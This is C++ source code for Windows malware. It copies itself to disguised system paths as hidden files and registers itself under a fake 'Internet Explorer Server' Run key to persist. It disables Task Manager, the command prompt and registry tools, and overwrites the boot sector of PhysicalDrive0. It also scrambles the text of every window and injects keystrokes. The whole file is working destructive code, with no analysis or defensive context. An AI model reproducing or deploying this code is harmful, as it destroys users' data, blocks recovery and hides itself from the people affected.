#include "System.h"
#include "Buffer.h"
#include <windows.h>
#define HKCU HKEY_CURRENT_USER
#define HKLM HKEY_LOCAL_MACHINE
const WCHAR* pathSystem = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM";

LPCWSTR UnicodeGen(int length) {
	LPWSTR str = new WCHAR[length + 1];
	for (int t = 0; t < length; t++) {
		str[t] = rand() % 236 + 20;
	}
	str[length] = L'\0';
	return str;
}

int CALLBACK EnumStrProc(HWND hwnd, LONG_PTR lPtr) {
	SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)UnicodeGen(15));
	return true;
}

namespace Payloads {


void InfectTheSystem(void) {
	LPCWSTR lpPaths[] = {
		L"%SystemRoot%\\System32\\Xrotonium.exe",
		L"C:\\Program Files\\Internet Explorer\\Connection Wizard\\ieserver.exe",
		L"%SystemRoot%\\System32\\oobe\\msoobd.exe" // Magistr reference!
	};
	for (int t = 0; t < _countof(lpPaths); t++) {
		System::CopyFilex(GetDir(), lpPaths[t], true, FILE_ATTRIBUTE_HIDDEN);
		System::ManageRegW(HKCU, pathSystem, L"DisableTaskmgr", REG_DWORD, 1, NULL, false, false);
		System::ManageRegW(HKCU, L"SOFTWARE\\POLICIES\\Microsoft\\Windows\\SYSTEM", L"DisableCmd", REG_DWORD, 2, NULL, false, false);
		System::ManageRegW(HKLM, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"Internet Explorer Server", 0, NULL, (LPBYTE)lpPaths[1], false, true);
		System::ManageRegW(HKCU, pathSystem, L"DisableRegistryTools", REG_DWORD, 1, NULL, false, false);
	}
}



DWORD CALLBACK GlitchText(LPVOID pvoid) {
	while (true) {
		HWND hwnd = GetDesktopWindow();
		EnumChildWindows(hwnd, &EnumStrProc, 0);
		Sleep(10);
	}
}

void OverwriteBootSectors(void) {
	DWORD dwWriteBytes;
	HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
	FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
	0, NULL);
	if (hDrive == INVALID_HANDLE_VALUE) {
		MessageBoxW(NULL, L"I failed to do my job, which is overwriting your boot sector,", L"Bruh", MB_ICONASTERISK);
		CloseHandle(hDrive);
		exit(0);
	}
	WriteFile(hDrive, rawData, 32768, &dwWriteBytes, NULL);
	CloseHandle(hDrive);
}

DWORD CALLBACK Inputs(LPVOID pvoid) {
	INPUT kinpt;
	System::SendKeyboardInput(kinpt, VK_CAPITAL, 250, 0);
	System::SendKeyboardInput(kinpt, VK_CAPITAL, 250, KEYEVENTF_KEYUP);
	System::SendKeyboardInput(kinpt, VK_SPACE, 250, 0);
	System::SendKeyboardInput(kinpt, VK_SPACE, 250, KEYEVENTF_KEYUP);
}

}
